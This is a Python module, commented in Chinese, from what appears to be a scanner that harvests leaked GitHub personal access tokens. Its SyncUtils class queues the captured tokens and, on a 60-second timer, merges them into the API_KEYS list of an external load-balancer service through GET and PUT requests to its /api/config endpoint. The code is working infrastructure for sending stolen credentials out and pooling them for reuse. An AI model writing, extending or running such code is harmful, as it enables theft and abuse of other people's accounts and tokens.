import json
import threading
import time
import traceback
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Optional

import requests

from common.Logger import logger
from common.config import Config
from utils.file_manager import file_manager, checkpoint


class SyncUtils:
    """同步工具类，负责异步发送捕获到的 GitHub PAT 到外部应用"""

    def __init__(self):
        """初始化同步工具 - 严谨对齐 Config 中的 GROK 变量名"""
        # --- 针对 GitHub PAT 专项版，我们依然沿用 GROK 变量名作为通道，但日志改为 PAT ---
        self.balancer_url = Config.GROK_BALANCER_URL.rstrip('/') if Config.GROK_BALANCER_URL else ""
        self.balancer_auth = Config.GROK_BALANCER_AUTH
        self.balancer_sync_enabled = Config.parse_bool(Config.GROK_BALANCER_SYNC_ENABLED)
        self.balancer_enabled = bool(self.balancer_url and self.balancer_auth and self.balancer_sync_enabled)

        # GPT Load Balancer 配置 (用于同步到 GPT 格式的网关)
        self.gpt_load_url = Config.GPT_LOAD_URL.rstrip('/') if Config.GPT_LOAD_URL else ""
        self.gpt_load_auth = Config.GPT_LOAD_AUTH
        self.gpt_load_group_names = [name.strip() for name in Config.GPT_LOAD_GROUP_NAME.split(',') if name.strip()] if Config.GPT_LOAD_GROUP_NAME else []
        self.gpt_load_sync_enabled = Config.parse_bool(Config.GPT_LOAD_SYNC_ENABLED)
        self.gpt_load_enabled = bool(self.gpt_load_url and self.gpt_load_auth and self.gpt_load_group_names and self.gpt_load_sync_enabled)

        # 异步线程池
        self.executor = ThreadPoolExecutor(max_workers=2, thread_name_prefix="SyncUtils")
        self.saving_checkpoint = False

        self.batch_interval = 60
        self.batch_timer = None
        self.shutdown_flag = False

        if not self.balancer_enabled:
            logger.info("ℹ️ GitHub PAT Sync to External Balancer is disabled.")
        else:
            logger.info(f"🔗 GitHub PAT Sync enabled - Target: {self.balancer_url}")

        # 启动周期性发送线程
        self._start_batch_sender()

    def add_keys_to_queue(self, keys: List[str]):
        """将有效的 github_pat_ 添加到发送队列"""
        if not keys: return

        while self.saving_checkpoint:
            time.sleep(0.5)

        self.saving_checkpoint = True
        try:
            if self.balancer_enabled:
                checkpoint.wait_send_balancer.update(keys)
                logger.info(f"📥 {len(keys)} Token(s) added to external sync queue.")
            
            if self.gpt_load_enabled:
                checkpoint.wait_send_gpt_load.update(keys)
            
            file_manager.save_checkpoint(checkpoint)
        finally:
            self.saving_checkpoint = False

    def _send_balancer_worker(self, keys: List[str]) -> str:
        """执行实际的 PUT 请求，将 PAT 更新到远程 API_KEYS 列表"""
        try:
            # 严谨对齐：虽然变量名带 GROK，但实质发送的是 PAT
            config_url = f"{self.balancer_url}/api/config"
            headers = {
                'Cookie': f'auth_token={self.balancer_auth}',
                'User-Agent': 'HajimiPATScanner/2.0'
            }

            # 1. 获取现有配置
            response = requests.get(config_url, headers=headers, timeout=20)
            if response.status_code != 200: return "err_get_config"

            config_data = response.json()
            current_api_keys = config_data.get('API_KEYS', [])
            
            # 2. 合并去重
            existing_set = set(current_api_keys)
            new_keys = [k for k in keys if k not in existing_set]
            
            if not new_keys: return "ok"

            config_data['API_KEYS'] = current_api_keys + new_keys
            
            # 3. 推送更新
            update_headers = headers.copy()
            update_headers['Content-Type'] = 'application/json'
            res = requests.put(config_url, headers=update_headers, json=config_data, timeout=30)
            
            if res.status_code == 200:
                # 记录发送成功的日志
                file_manager.save_keys_send_result(new_keys, {k: "ok" for k in new_keys})
                return "ok"
            return f"err_put_{res.status_code}"

        except Exception as e:
            logger.error(f"❌ Sync Worker Exception: {str(e)}")
            return "exception"

    def _start_batch_sender(self) -> None:
        if self.shutdown_flag: return
        self.executor.submit(self._batch_send_worker)
        self.batch_timer = threading.Timer(self.batch_interval, self._start_batch_sender)
        self.batch_timer.daemon = True
        self.batch_timer.start()

    def _batch_send_worker(self) -> None:
        """批量处理同步队列"""
        if self.saving_checkpoint: return
        self.saving_checkpoint = True
        try:
            if checkpoint.wait_send_balancer and self.balancer_enabled:
                keys = list(checkpoint.wait_send_balancer)
                if self._send_balancer_worker(keys) == 'ok':
                    checkpoint.wait_send_balancer.clear()
                    logger.info("✅ External Balancer sync successful.")

            # 此处可扩展 GPT Load Balancer 的同步逻辑
            
            file_manager.save_checkpoint(checkpoint)
        except Exception as e:
            logger.error(f"❌ Batch Sync Error: {e}")
        finally:
            self.saving_checkpoint = False

    def shutdown(self) -> None:
        self.shutdown_flag = True
        if self.batch_timer: self.batch_timer.cancel()
        self.executor.shutdown(wait=True)

sync_utils = SyncUtils()
